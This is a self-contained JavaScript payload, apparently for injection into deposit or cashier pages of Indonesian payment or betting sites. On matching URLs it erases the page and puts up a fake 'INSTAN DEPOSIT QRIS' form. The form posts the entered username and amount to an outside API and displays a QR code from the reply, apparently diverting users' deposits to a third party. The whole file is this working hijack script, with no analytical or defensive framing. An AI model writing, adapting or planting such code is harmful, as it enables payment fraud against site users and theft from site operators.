(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  const shouldRun = match.some(path => url.includes(path));
  if (!shouldRun) return;

  document.documentElement.innerHTML = '<head></head><body></body>';

  document.head.insertAdjacentHTML('beforeend', `
    <title>INSTAN DEPOSIT QRIS</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
    <style>
      body { margin: 0; background: #000; font-family: 'Montserrat', sans-serif; text-align: center; color: #fff; }
      h1 { font-weight: 700; margin: 20px 0; text-shadow: 2px 2px #000; color: #f7e733; font-size: 22px; }
      .content { margin-top: 20px; }
      img.qris { max-width: 220px; margin: 15px auto; display: block; }
      button, input {
        display: block; margin: 10px auto; padding: 10px; font-size: 14px;
        border: none; border-radius: 5px; width: 85%; max-width: 280px;
      }
      button { background: #f7e733; color: #000; font-weight: 700; cursor: pointer; }
      input { text-align: center; }
      #status { color: #00ff00; font-weight: 700; margin-top: 10px; }
    </style>
  `);

  document.body.innerHTML = `
    <h1>INSTAN DEPOSIT QRIS</h1>
    <div class="content" id="content">
      <input type="text" id="username" placeholder="Masukkan Username">
      <input type="text" id="amount" placeholder="Masukkan Nominal">
      <button id="confirmBtn">KONFIRMASI</button>
      <div id="status"></div>
    </div>
  `;

  document.getElementById('amount').addEventListener('input', formatAmount);
  document.getElementById('confirmBtn').addEventListener('click', confirmDeposit);

  function formatAmount(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val) val = parseInt(val).toLocaleString('id-ID');
    e.target.value = val;
  }

  async function confirmDeposit() {
    const usernameInput = document.getElementById('username');
    const amountInput = document.getElementById('amount');
    const status = document.getElementById('status');

    const username = usernameInput.value.trim();
    let val = amountInput.value.replace(/\./g, '').replace(/,/g, '');
    const nominal = parseInt(val);

    if (!username) {
      status.innerText = "Username wajib diisi!";
      status.style.color = "#ff0000";
      return;
    }

    if (isNaN(nominal) || nominal < 50000) {
      status.innerText = "Minimal deposit 50.000";
      status.style.color = "#ff0000";
      return;
    }

    status.innerText = "Sedang generate QRIS...";

    try {
      const resp = await fetch("https://rest.otomatis.vip/api/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: username,
          amount: nominal,
          uuid: "e1b4b648-cc7d-4a39-8a07-6e22904780c9",
          expire: 1200,
          custom_ref: "887"
        })
      });

      const data = await resp.json();

      if (data.data) {
        const qr_url = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.data)}`;
        document.getElementById("content").innerHTML = `
          <img class="qris" src="${qr_url}" />
          <p style="font-weight:600;color:#fff;">QRIS untuk <span style="color:#00f7ff">${username}</span> Rp ${nominal.toLocaleString('id-ID')}</p>
          <button onclick="window.open('${qr_url}')">Download QRIS</button>
          <button onclick="location.reload()">Buat Lagi</button>
        `;
      } else {
        status.innerText = "Gagal generate QRIS";
        status.style.color = "#ff0000";
      }
    } catch (err) {
      console.error(err);
      status.innerText = "Error koneksi ke API";
      status.style.color = "#ff0000";
    }
  }
})();
